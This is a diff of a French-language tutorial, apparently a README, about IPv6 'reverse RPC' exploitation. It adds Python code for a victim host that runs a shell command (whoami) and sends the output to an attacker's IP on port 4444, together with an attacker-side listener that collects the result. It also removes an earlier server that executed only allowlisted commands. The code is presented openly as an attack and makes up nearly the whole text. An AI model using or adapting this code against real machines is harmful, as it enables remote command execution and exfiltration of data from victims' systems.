@@ -90,49 +90,60 @@ print(f"Exploit envoyé vers {victim_ip} pour établir une connexion RPC invers�
 
 ```
 
-## 2️⃣ Code Python : Serveur RPC de l'attaquant
+## 2️⃣ Code Cible : Exécution Forcée & Connexion RPC Inversée
+
+```python
+import socket
+import subprocess
+
+# Adresse et port du serveur de l'attaquant (où envoyer la réponse)
+attacker_ip = "fe80::2"  # Remplace par ton IPv6
+attacker_port = 4444  # Port d'écoute
+
+# Exécution de la commande
+try:
+    result = subprocess.check_output("whoami", shell=True, stderr=subprocess.STDOUT, text=True)
+except Exception as e:
+    result = f"Erreur : {str(e)}"
+
+# Création de la connexion RPC inversée
+sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+sock.connect((attacker_ip, attacker_port))
+
+# Envoi du résultat au serveur de l'attaquant
+sock.sendall(result.encode())
+sock.close()
+
+```
+
+
+## 3️⃣ Code Attaquant : Serveur d’Écoute (Réception de la Réponse)
 
 ```python 
 import socket
-import subprocess
-import shlex
 
-# Configuration du serveur
-server_ip = "::"  # Accepte les connexions entrantes en IPv6
-server_port = 9000  # Port où le serveur écoute
+# Adresse IPv6 et port d'écoute
+attacker_ip = "::"  # Accepte toutes les connexions IPv6
+attacker_port = 4444
 
-# Liste des commandes autorisées à exécuter
-allowed_commands = ["whoami", "hostname", "date"]
+# Création du socket d'écoute
+sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
+sock.bind((attacker_ip, attacker_port))
+sock.listen(5)
 
-# Création du socket UDP IPv6
-sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
-sock.bind((server_ip, server_port))
+print(f"Attaquant en attente de connexion RPC sur le port {attacker_port}...")
 
-print(f"Serveur IPv6 en écoute sur le port {server_port}...")
+# Attente de connexion de la victime
+conn, addr = sock.accept()
+print(f"Connexion reçue de {addr}")
 
-while True:
-    # Réception du paquet IPv6
-    data, addr = sock.recvfrom(1024)
-    command = data.decode().strip()
-    print(f"Commande reçue de {addr}: {command}")
+# Réception et affichage du résultat de la commande
+data = conn.recv(1024)
+print(f"Résultat reçu : {data.decode().strip()}")
 
-    # Vérification que la commande est autorisée
-    if command not in allowed_commands:
-        response = f"Commande non autorisée : {command}"
-        sock.sendto(response.encode(), addr)
-        print("Réponse envoyée : Commande non autorisée.")
-        continue  # Ignore la commande malveillante
-
-    # Sécurisation de l'exécution avec shlex pour éviter l'injection
-    try:
-        command_args = shlex.split(command)  # Sécurise la commande
-        result = subprocess.check_output(command_args, stderr=subprocess.STDOUT, text=True)
-    except Exception as e:
-        result = f"Erreur d'exécution : {str(e)}"
-
-    # Envoi de la réponse à l'attaquant
-    sock.sendto(result.encode(), addr)
-    print(f"Réponse envoyée : {result}")
+# Fermeture de la connexion
+conn.close()
+sock.close()
 
 
 
